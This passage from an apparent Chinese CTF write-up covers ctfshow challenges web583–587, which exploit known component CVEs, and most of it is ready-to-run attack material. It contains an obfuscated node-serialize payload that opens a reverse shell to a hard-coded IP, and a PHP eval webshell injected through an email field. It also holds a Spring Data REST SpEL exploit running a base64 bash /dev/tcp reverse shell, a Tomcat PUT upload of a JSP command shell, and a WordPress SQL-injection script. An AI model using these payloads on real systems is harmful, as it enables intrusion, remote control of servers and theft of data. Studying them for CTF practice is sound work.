<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python2 1.py 156.238.233.9 9999</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function ()&#123;YOUR-PAYLOAD&#125;()&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function ()&#123;eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,53,54,46,50,51,56,46,50,51,51,46,57,34,59,10,80,79,82,84,61,34,57,57,57,57,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))&#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们也进行base64编码，打入即可反弹shell</p>
<h2 id="web583"><a href="#web583" class="headerlink" title="web583"></a>web583</h2><p>有NDAY，是写入webshell，可以直接打</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>2e847728-8d07-4d42-87ad-10936fc56cc4.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>33</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://2e847728-8d07-4d42-87ad-10936fc56cc4.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://2e847728-8d07-4d42-87ad-10936fc56cc4.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1</span><br><span class="line"></span><br><span class="line"><span class="language-php">name=aaa&amp;email=<span class="string">&quot;aaa&quot;</span>.+-OQueueDirectory=/tmp/.+-X/<span class="keyword">var</span>/www/html/a.php+@aaa.com&amp;message=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="web584"><a href="#web584" class="headerlink" title="web584"></a>web584</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/166373950">CVE-2017-8046</a> 先创建用户</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/people</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>3d0f84d0-ac3b-4dbd-b6bf-74d156de052c.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;firstName&quot;</span><span class="punctuation">:</span><span class="string">&quot;wi&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lastName&quot;</span><span class="punctuation">:</span><span class="string">&quot;win&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTYuMjM4LjIzMy45Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line">bytecode = <span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(payload))</span><br><span class="line"><span class="built_in">print</span>(bytecode)</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PATCH</span> <span class="string">/api/people/1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>3d0f84d0-ac3b-4dbd-b6bf-74d156de052c.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json-patch+json</span><br><span class="line"></span><br><span class="line"><span class="language-dns">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;<span class="number">98,97,115,104</span>,<span class="number">32,45,99,32</span>,<span class="number">123,101,99,104</span>,<span class="number">111,44,89,109</span>,<span class="number">70,122,97,67</span>,<span class="number">65,116,97,83</span>,<span class="number">65,43,74,105</span>,<span class="number">65,118,90,71</span>,<span class="number">86,50,76,51</span>,<span class="number">82,106,99,67</span>,<span class="number">56,120,78,84</span>,<span class="number">89,117,77,106</span>,<span class="number">77,52,76,106</span>,<span class="number">73,122,77,121</span>,<span class="number">52,53,76,122</span>,<span class="number">107,53,79,84</span>,<span class="number">107,103,77,68</span>,<span class="number">52,109,77,81</span>,<span class="number">61,61,125,124</span>,<span class="number">123,98,97,115</span>,<span class="number">101,54,52,44</span>,<span class="number">45,100,125,124</span>,<span class="number">123,98,97,115</span>,<span class="number">104,44,45,105</span>,<span class="number">125</span>&#125;))/lastname&quot;, &quot;value&quot;: &quot;whatever&quot; &#125;]</span></span><br></pre></td></tr></table></figure>

<h2 id="web585"><a href="#web585" class="headerlink" title="web585"></a>web585</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/confidant/p/15440233.html">Apache Tomcat（CVE-2017-12615）</a>，没错这就是去年年底那个，PUT上传jsp木马的第一版本，那个属于是绕过这个CVE修补之后的限制，所以直接上传就好了</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/a.jsp/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>c08e86b7-9d9a-4b5a-9f0e-be213b4f5f56.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-site</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1</span><br><span class="line"></span><br><span class="line"><span class="language-gradle">&lt;%</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span></span><br><span class="line"><span class="language-gradle">	java.io.InputStream in =<span class="keyword">Runtime</span>.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span></span><br><span class="line"><span class="language-gradle">	<span class="keyword">int</span> a = -<span class="number">1</span>;</span></span><br><span class="line"><span class="language-gradle">	<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span></span><br><span class="line"><span class="language-gradle">	out.<span class="keyword">print</span>(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-gradle">	<span class="keyword">while</span>((a=in.<span class="keyword">read</span>(b))!=-<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-gradle">		out.<span class="keyword">println</span>(<span class="keyword">new</span> String(b));</span></span><br><span class="line"><span class="language-gradle"> 	&#125;</span></span><br><span class="line"><span class="language-gradle">	out.<span class="keyword">print</span>(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"> &#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问<code>/a.jsp?pwd=023&amp;i=cat /flag</code></p>
<h2 id="web586"><a href="#web586" class="headerlink" title="web586"></a>web586</h2><p>近期文章  WordPress 某插件存在sql注入 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39896">漏洞文章</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">populate_download_edit_form</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$wpdb</span>; <span class="comment">// this is how you get access to the database</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$value</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$download</span> = <span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">get_row</span>( <span class="string">&quot;SELECT * FROM <span class="subst">&#123;$wpdb-&gt;prefix&#125;</span>doifd_lab_downloads WHERE doifd_download_id = <span class="subst">$value</span>&quot;</span>, ARRAY_A );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>( <span class="variable">$download</span> );</span><br><span class="line">    <span class="keyword">die</span>(); <span class="comment">// this is required to terminate immediately and return a proper response</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好像是有点问题，没出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://3939c8e7-0e79-499f-bfc4-a13ce882aa33.challenge.ctf.show:443/wp-admin/admin-ajax.php?action=populate_download_edit_form&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;cf_clearance&quot;</span>: <span class="string">&quot;FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs&quot;</span>, <span class="string">&quot;SL_G_WPT_TO&quot;</span>: <span class="string">&quot;zh&quot;</span>, <span class="string">&quot;SL_GWPT_Show_Hide_tmp&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;SL_wptGlobTipTmp&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Sec-Ch-Ua&quot;</span>: <span class="string">&quot;\&quot;Not A(Brand\&quot;;v=\&quot;8\&quot;, \&quot;Chromium\&quot;;v=\&quot;132\&quot;, \&quot;Google Chrome\&quot;;v=\&quot;132\&quot;&quot;</span>, <span class="string">&quot;Sec-Ch-Ua-Mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>, <span class="string">&quot;Sec-Ch-Ua-Platform&quot;</span>: <span class="string">&quot;\&quot;Windows\&quot;&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>, <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>, <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;navigate&quot;</span>, <span class="string">&quot;Sec-Fetch-User&quot;</span>: <span class="string">&quot;?1&quot;</span>, <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;document&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://3939c8e7-0e79-499f-bfc4-a13ce882aa33.challenge.ctf.show/&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>, <span class="string">&quot;Priority&quot;</span>: <span class="string">&quot;u=0, i&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">burp0_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;0 union select 1,2,3,4,5,6,load_file(0x2f666c61675f69735f68657265)--+&quot;</span>&#125;</span><br><span class="line">r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br></pre></td></tr></table></figure>

<p>返回是400错误，一直打不通，但是exp我敢肯定是对的</p>
<h2 id="web587"><a href="#web587" class="headerlink" title="web587"></a>web587</h2><p>CVE-2017-10271，访问<code>/wls-wsat/CoordinatorPortType</code>发现漏洞点</p>
<p><img src="/../images/achieve/2025/2/ctfshow%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/QQ20250222-165516.jpg" alt="1"></p>
